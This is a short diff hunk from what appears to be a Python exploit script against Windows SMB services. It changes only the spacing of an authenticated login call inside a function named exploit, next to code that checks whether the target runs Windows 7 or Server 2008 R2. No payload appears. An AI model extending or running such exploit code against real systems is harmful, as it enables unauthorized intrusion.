@@ -801,7 +801,7 @@ def exploit(target, port, pipe_name):
 
 	info = {}
 
-	conn.login(USERNAME, PASSWORD,DOMAIN,maxBufferSize=4356)
+	conn.login(USERNAME, PASSWORD, DOMAIN, maxBufferSize=4356)
 	server_os = conn.get_server_os()
 	print('Target OS: '+server_os)
 	if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
